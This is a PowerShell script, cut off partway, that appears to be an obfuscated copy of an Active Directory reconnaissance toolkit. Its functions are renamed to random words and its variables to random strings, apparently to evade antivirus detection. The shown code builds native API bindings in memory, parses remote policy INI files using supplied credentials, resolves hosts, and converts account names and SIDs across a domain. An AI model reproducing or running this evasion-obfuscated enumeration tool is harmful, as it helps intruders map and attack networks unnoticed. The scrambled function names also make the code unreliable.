function compunctions {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )
    $FOhmitIa99 = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $zspMhttM99 = $FOhmitIa99.GetAssemblies()
    foreach ($sPJVJrBP99 in $zspMhttM99) {
        if ($sPJVJrBP99.FullName -and ($sPJVJrBP99.FullName.Split(',')[0] -eq $ModuleName)) {
            return $sPJVJrBP99
        }
    }
    $cbxYDAYS99 = New-Object Reflection.AssemblyName($ModuleName)
    $StsWGohF99 = $FOhmitIa99
    $JvxHSZRq99 = $StsWGohF99.DefineDynamicAssembly($cbxYDAYS99, 'Run')
    $sPzkfWQt99 = $JvxHSZRq99.DefineDynamicModule($ModuleName, $False)
    return $sPzkfWQt99
}
function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,
        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,
        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,
        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,
        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,
        [String]
        $zjARrjoK99,
        [Switch]
        $SetLastError
    )
    $pwEfoKvn99 = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }
    if ($ParameterTypes) { $pwEfoKvn99['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $pwEfoKvn99['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $pwEfoKvn99['Charset'] = $Charset }
    if ($SetLastError) { $pwEfoKvn99['SetLastError'] = $SetLastError }
    if ($zjARrjoK99) { $pwEfoKvn99['EntryPoint'] = $zjARrjoK99 }
    New-Object PSObject -Property $pwEfoKvn99
}
function imprisons
{
    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $zjARrjoK99,
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,
        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )
    BEGIN
    {
        $LGNmriwP99 = @{}
    }
    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $LGNmriwP99[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $LGNmriwP99[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            if (!$LGNmriwP99.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $LGNmriwP99[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $LGNmriwP99[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }
            $vKlpkKQd99 = $LGNmriwP99[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)
            $i = 1
            foreach($pEYJKaUz99 in $ParameterTypes)
            {
                if ($pEYJKaUz99.IsByRef)
                {
                    [void] $vKlpkKQd99.DefineParameter($i, 'Out', $null)
                }
                $i++
            }
            $CiXcfFLS99 = [Runtime.InteropServices.DllImportAttribute]
            $jtMhPwJA99 = $CiXcfFLS99.GetField('SetLastError')
            $hBeZGZuS99 = $CiXcfFLS99.GetField('CallingConvention')
            $mkEhcRxO99 = $CiXcfFLS99.GetField('CharSet')
            $TjnGdrFj99 = $CiXcfFLS99.GetField('EntryPoint')
            if ($SetLastError) { $oAkNMCaS99 = $True } else { $oAkNMCaS99 = $False }
            if ($PSBoundParameters['EntryPoint']) { $HIPaxfTU99 = $zjARrjoK99 } else { $HIPaxfTU99 = $FunctionName }
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $tkKorNUu99 = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($jtMhPwJA99,
                                           $hBeZGZuS99,
                                           $mkEhcRxO99,
                                           $TjnGdrFj99),
                [Object[]] @($oAkNMCaS99,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $HIPaxfTU99))
            $vKlpkKQd99.SetCustomAttribute($tkKorNUu99)
        }
    }
    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $LGNmriwP99
        }
        $fYgjquix99 = @{}
        foreach ($Key in $LGNmriwP99.Keys)
        {
            $Type = $LGNmriwP99[$Key].CreateType()
            $fYgjquix99[$Key] = $Type
        }
        return $fYgjquix99
    }
}
function Miller {
    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $WVwefqxI99,
        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XfpYPiKl99,
        [Switch]
        $Bitfield
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($WVwefqxI99))
    }
    $mtXYKnxe99 = $Type -as [Type]
    $XCCJiUBp99 = $Module.DefineEnum($WVwefqxI99, 'Public', $mtXYKnxe99)
    if ($Bitfield)
    {
        $WmMkqAlQ99 = [FlagsAttribute].GetConstructor(@())
        $OlrwUSQq99 = New-Object Reflection.Emit.CustomAttributeBuilder($WmMkqAlQ99, @())
        $XCCJiUBp99.SetCustomAttribute($OlrwUSQq99)
    }
    foreach ($Key in $XfpYPiKl99.Keys)
    {
        $null = $XCCJiUBp99.DefineLiteral($Key, $XfpYPiKl99[$Key] -as $mtXYKnxe99)
    }
    $XCCJiUBp99.CreateType()
}
function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $FuJsSmml99,
        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,
        [Parameter(Position = 2)]
        [UInt16]
        $LIdFeKYN99,
        [Object[]]
        $MarshalAs
    )
    @{
        Position = $FuJsSmml99
        Type = $Type -as [Type]
        Offset = $LIdFeKYN99
        MarshalAs = $MarshalAs
    }
}
function leadership
{
    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $WVwefqxI99,
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $rrRKCASc99,
        [Reflection.Emit.PackingSize]
        $zCLelUlx99 = [Reflection.Emit.PackingSize]::Unspecified,
        [Switch]
        $SKqMBMxJ99
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($WVwefqxI99))
    }
    [Reflection.TypeAttributes] $uzlohIiQ99 = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'
    if ($SKqMBMxJ99)
    {
        $uzlohIiQ99 = $uzlohIiQ99 -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $uzlohIiQ99 = $uzlohIiQ99 -bor [Reflection.TypeAttributes]::SequentialLayout
    }
    $nQDZfomz99 = $Module.DefineType($WVwefqxI99, $uzlohIiQ99, [ValueType], $zCLelUlx99)
    $BpGJDpah99 = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $adNwjBYF99 = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
    $gKXUbiMw99 = New-Object Hashtable[]($rrRKCASc99.Count)
    foreach ($Field in $rrRKCASc99.Keys)
    {
        $Index = $rrRKCASc99[$Field]['Position']
        $gKXUbiMw99[$Index] = @{FieldName = $Field; Properties = $rrRKCASc99[$Field]}
    }
    foreach ($Field in $gKXUbiMw99)
    {
        $ijFdNhcu99 = $Field['FieldName']
        $VeCzZtCk99 = $Field['Properties']
        $LIdFeKYN99 = $VeCzZtCk99['Offset']
        $Type = $VeCzZtCk99['Type']
        $MarshalAs = $VeCzZtCk99['MarshalAs']
        $QQDYZIsW99 = $nQDZfomz99.DefineField($ijFdNhcu99, $Type, 'Public')
        if ($MarshalAs)
        {
            $VksnMFor99 = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $DTrSMOvF99 = New-Object Reflection.Emit.CustomAttributeBuilder($BpGJDpah99,
                    $VksnMFor99, $adNwjBYF99, @($Size))
            }
            else
            {
                $DTrSMOvF99 = New-Object Reflection.Emit.CustomAttributeBuilder($BpGJDpah99, [Object[]] @($VksnMFor99))
            }
            $QQDYZIsW99.SetCustomAttribute($DTrSMOvF99)
        }
        if ($SKqMBMxJ99) { $QQDYZIsW99.SetOffset($LIdFeKYN99) }
    }
    $hcVuSyLo99 = $nQDZfomz99.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $NBCYBaYS99 = $hcVuSyLo99.GetILGenerator()
    $NBCYBaYS99.Emit([Reflection.Emit.OpCodes]::Ldtoken, $nQDZfomz99)
    $NBCYBaYS99.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $NBCYBaYS99.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $NBCYBaYS99.Emit([Reflection.Emit.OpCodes]::Ret)
    $RHNpwaMS99 = $nQDZfomz99.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $nQDZfomz99,
        [Type[]] @([IntPtr]))
    $UwazNUDe99 = $RHNpwaMS99.GetILGenerator()
    $UwazNUDe99.Emit([Reflection.Emit.OpCodes]::Nop)
    $UwazNUDe99.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $UwazNUDe99.Emit([Reflection.Emit.OpCodes]::Ldtoken, $nQDZfomz99)
    $UwazNUDe99.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $UwazNUDe99.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $UwazNUDe99.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $nQDZfomz99)
    $UwazNUDe99.Emit([Reflection.Emit.OpCodes]::Ret)
    $nQDZfomz99.CreateType()
}
Function pharyngeal {
    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$Name,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [System.Type]$Type = [int],
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string[]]$Alias,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$sIxnNDjc99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [int]$FuJsSmml99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$mFdlaZIg99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$yxtQxOMA99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$CtrCzrVr99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$jmocCQdf99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$QogeTXzL99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$WFsgRlKp99 = '__AllParameterSets',
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$LLcZWrUg99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$SatZgWnm99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$lpocsTOF99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ybJMzziG99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$hIgpjEDq99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$hKzgDuVG99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$EMYtrtja99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$nSQACDek99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$zqOupMMB99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$CclXghvv99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$WsFzHTtP99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw 'Dictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object'
            }
            $true
        })]
        $TtjENDGQ99 = $false,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [switch]$preAkVMm99,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if($_.GetType().Name -notmatch 'Dictionary') {
                Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'
            }
            $true
        })]
        $yCVbxJse99
    )
    Begin {
        $smrTwRQw99 = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        $OzbjLuwW99 = (Get-Command _temp).Parameters.Keys
    }
    Process {
        if($preAkVMm99) {
            $YNBgeQqn99 = $yCVbxJse99.Keys | Where-Object { $OzbjLuwW99 -notcontains $_ }
            ForEach($pEYJKaUz99 in $YNBgeQqn99) {
                if ($pEYJKaUz99) {
                    Set-Variable -Name $pEYJKaUz99 -Value $yCVbxJse99.$pEYJKaUz99 -Scope 1 -Force
                }
            }
        }
        else {
            $DIxnmDip99 = @()
            $DIxnmDip99 = $PSBoundParameters.GetEnumerator() |
                        ForEach-Object {
                            if($_.Value.PSobject.Methods.Name -match '^Equals$') {
                                if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                if($_.Value -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if($DIxnmDip99) {
                $DIxnmDip99 | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
            }
            $SCfCijUo99 = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            Select-Object -ExpandProperty Key |
                                                Where-Object { $PSBoundParameters.Keys -notcontains $_ }
            $tmp = $null
            ForEach ($pEYJKaUz99 in $SCfCijUo99) {
                $HZUpZkZc99 = Get-Variable -Name $pEYJKaUz99 -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue($pEYJKaUz99, [ref]$tmp) -and $HZUpZkZc99) {
                    $PSBoundParameters.$pEYJKaUz99 = $HZUpZkZc99
                }
            }
            if($TtjENDGQ99) {
                $kNLhrlzo99 = $TtjENDGQ99
            }
            else {
                $kNLhrlzo99 = $smrTwRQw99
            }
            $eZXMRnht99 = {Get-Variable -Name $_ -ValueOnly -Scope 0}
            $aiNaLNBp99 = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
            $KtNtCzdS99 = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
            $xpiDMnpz99 = '^Alias$'
            $XvpsKDdv99 = New-Object -TypeName System.Management.Automation.ParameterAttribute
            switch -regex ($PSBoundParameters.Keys) {
                $aiNaLNBp99 {
                    Try {
                        $XvpsKDdv99.$_ = . $eZXMRnht99
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }
            if($kNLhrlzo99.Keys -contains $Name) {
                $kNLhrlzo99.$Name.Attributes.Add($XvpsKDdv99)
            }
            else {
                $aLbxoQNu99 = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    $KtNtCzdS99 {
                        Try {
                            $TjmbZjvL99 = New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $eZXMRnht99) -ErrorAction Stop
                            $aLbxoQNu99.Add($TjmbZjvL99)
                        }
                        Catch { $_ }
                        continue
                    }
                    $xpiDMnpz99 {
                        Try {
                            $OcWYEgTR99 = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $eZXMRnht99) -ErrorAction Stop
                            $aLbxoQNu99.Add($OcWYEgTR99)
                            continue
                        }
                        Catch { $_ }
                    }
                }
                $aLbxoQNu99.Add($XvpsKDdv99)
                $pEYJKaUz99 = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $aLbxoQNu99)
                $kNLhrlzo99.Add($Name, $pEYJKaUz99)
            }
        }
    }
    End {
        if(!$preAkVMm99 -and !$TtjENDGQ99) {
            $kNLhrlzo99
        }
    }
}
function assailable {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $kPTepGVF99
    )
    BEGIN {
        $yOPPlUQQ99 = @{}
    }
    PROCESS {
        ForEach ($kkUVHmBq99 in $Path) {
            if (($kkUVHmBq99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $WSnpkeEP99 = (New-Object System.Uri($kkUVHmBq99)).Host
                if (-not $yOPPlUQQ99[$WSnpkeEP99]) {
                    disservice -BoyAErDp99 $WSnpkeEP99 -DegNROrc99 $DegNROrc99
                    $yOPPlUQQ99[$WSnpkeEP99] = $True
                }
            }
            if (Test-Path -Path $kkUVHmBq99) {
                if ($PSBoundParameters['OutputObject']) {
                    $bPZMBdIM99 = New-Object PSObject
                }
                else {
                    $bPZMBdIM99 = @{}
                }
                Switch -Regex -File $kkUVHmBq99 {
                    "^\[(.+)\]" # Section
                    {
                        $wykgpRZa99 = $matches[1].Trim()
                        if ($PSBoundParameters['OutputObject']) {
                            $wykgpRZa99 = $wykgpRZa99.Replace(' ', '')
                            $VGeVWiqm99 = New-Object PSObject
                            $bPZMBdIM99 | Add-Member Noteproperty $wykgpRZa99 $VGeVWiqm99
                        }
                        else {
                            $bPZMBdIM99[$wykgpRZa99] = @{}
                        }
                        $JlAmytpr99 = 0
                    }
                    "^(;.*)$" # Comment
                    {
                        $Value = $matches[1].Trim()
                        $JlAmytpr99 = $JlAmytpr99 + 1
                        $Name = 'Comment' + $JlAmytpr99
                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $bPZMBdIM99.$wykgpRZa99 | Add-Member Noteproperty $Name $Value
                        }
                        else {
                            $bPZMBdIM99[$wykgpRZa99][$Name] = $Value
                        }
                    }
                    "(.+?)\s*=(.*)" # Key
                    {
                        $Name, $Value = $matches[1..2]
                        $Name = $Name.Trim()
                        $oQimNIoY99 = $Value.split(',') | ForEach-Object { $_.Trim() }
                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $bPZMBdIM99.$wykgpRZa99 | Add-Member Noteproperty $Name $oQimNIoY99
                        }
                        else {
                            $bPZMBdIM99[$wykgpRZa99][$Name] = $oQimNIoY99
                        }
                    }
                }
                $bPZMBdIM99
            }
        }
    }
    END {
        $yOPPlUQQ99.Keys | moronic
    }
}
function premeditation {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $miMAbRWZ99,
        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,
        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $YTrwuSqu99 = ',',
        [Switch]
        $lrJCUgzC99
    )
    BEGIN {
        $WQoeIhZa99 = [IO.Path]::GetFullPath($PSBoundParameters['Path'])
        $CtHhimap99 = [System.IO.File]::Exists($WQoeIhZa99)
        $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex'
        $Null = $Mutex.WaitOne()
        if ($PSBoundParameters['Append']) {
            $XYxkyGOh99 = [System.IO.FileMode]::Append
        }
        else {
            $XYxkyGOh99 = [System.IO.FileMode]::Create
            $CtHhimap99 = $False
        }
        $TvUDkxnX99 = New-Object IO.FileStream($WQoeIhZa99, $XYxkyGOh99, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        $mowtGYhb99 = New-Object System.IO.StreamWriter($TvUDkxnX99)
        $mowtGYhb99.AutoFlush = $True
    }
    PROCESS {
        ForEach ($Entry in $miMAbRWZ99) {
            $XpcghWLb99 = ConvertTo-Csv -miMAbRWZ99 $Entry -YTrwuSqu99 $YTrwuSqu99 -NoTypeInformation
            if (-not $CtHhimap99) {
                $XpcghWLb99 | ForEach-Object { $mowtGYhb99.WriteLine($_) }
                $CtHhimap99 = $True
            }
            else {
                $XpcghWLb99[1..($XpcghWLb99.Length-1)] | ForEach-Object { $mowtGYhb99.WriteLine($_) }
            }
        }
    }
    END {
        $Mutex.ReleaseMutex()
        $mowtGYhb99.Dispose()
        $TvUDkxnX99.Dispose()
    }
}
function Mg {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $BoyAErDp99 = $Env:COMPUTERNAME
    )
    PROCESS {
        ForEach ($YaYHUvEO99 in $BoyAErDp99) {
            try {
                @(([Net.Dns]::GetHostEntry($YaYHUvEO99)).AddressList) | ForEach-Object {
                    if ($_.AddressFamily -eq 'InterNetwork') {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty 'ComputerName' $YaYHUvEO99
                        $Out | Add-Member Noteproperty 'IPAddress' $_.IPAddressToString
                        $Out
                    }
                }
            }
            catch {
                Write-Verbose "[Mg] Could not resolve $YaYHUvEO99 to an IP Address."
            }
        }
    }
}
function peter {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'Identity')]
        [String[]]
        $OFBZmnwK99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $skAwShCy99 = @{}
        if ($PSBoundParameters['Domain']) { $skAwShCy99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['Server']) { $skAwShCy99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['Credential']) { $skAwShCy99['Credential'] = $DegNROrc99 }
    }
    PROCESS {
        ForEach ($Object in $OFBZmnwK99) {
            $Object = $Object -Replace '/','\'
            if ($PSBoundParameters['Credential']) {
                $DN = loomed -FMEdvzGY99 $Object -ffAeRAxr99 'DN' @DomainSearcherArguments
                if ($DN) {
                    $GOrSdVAL99 = $DN.SubString($DN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    $XOIvwKgj99 = $DN.Split(',')[0].split('=')[1]
                    $skAwShCy99['Identity'] = $XOIvwKgj99
                    $skAwShCy99['Domain'] = $GOrSdVAL99
                    $skAwShCy99['Properties'] = 'objectsid'
                    structuring @DomainSearcherArguments | Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains('\')) {
                        $StsWGohF99 = $Object.Split('\')[0]
                        $Object = $Object.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters['Domain']) {
                        $skAwShCy99 = @{}
                        $StsWGohF99 = (Md @DomainSearcherArguments).Name
                    }
                    $Obj = (New-Object System.Security.Principal.NTAccount($StsWGohF99, $Object))
                    $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose "[peter] Error converting $StsWGohF99\$Object : $_"
                }
            }
        }
    }
}
function chews {
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        $GTVZZPBV99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $GBBmxRSu99 = @{}
        if ($PSBoundParameters['Domain']) { $GBBmxRSu99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['Server']) { $GBBmxRSu99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['Credential']) { $GBBmxRSu99['Credential'] = $DegNROrc99 }
    }
    PROCESS {
        ForEach ($vsPNMyyw99 in $GTVZZPBV99) {
            $vsPNMyyw99 = $vsPNMyyw99.trim('*')
            try {
                Switch ($vsPNMyyw99) {
                    'S-1-0'         { 'Null Authority' }
                    'S-1-0-0'       { 'Nobody' }
                    'S-1-1'         { 'World Authority' }
                    'S-1-1-0'       { 'Everyone' }
                    'S-1-2'         { 'Local Authority' }
                    'S-1-2-0'       { 'Local' }
                    'S-1-2-1'       { 'Console Logon ' }
                    'S-1-3'         { 'Creator Authority' }
                    'S-1-3-0'       { 'Creator Owner' }
                    'S-1-3-1'       { 'Creator Group' }
                    'S-1-3-2'       { 'Creator Owner Server' }
                    'S-1-3-3'       { 'Creator Group Server' }
                    'S-1-3-4'       { 'Owner Rights' }
                    'S-1-4'         { 'Non-unique Authority' }
                    'S-1-5'         { 'NT Authority' }
                    'S-1-5-1'       { 'Dialup' }
                    'S-1-5-2'       { 'Network' }
                    'S-1-5-3'       { 'Batch' }
                    'S-1-5-4'       { 'Interactive' }
                    'S-1-5-6'       { 'Service' }
                    'S-1-5-7'       { 'Anonymous' }
                    'S-1-5-8'       { 'Proxy' }
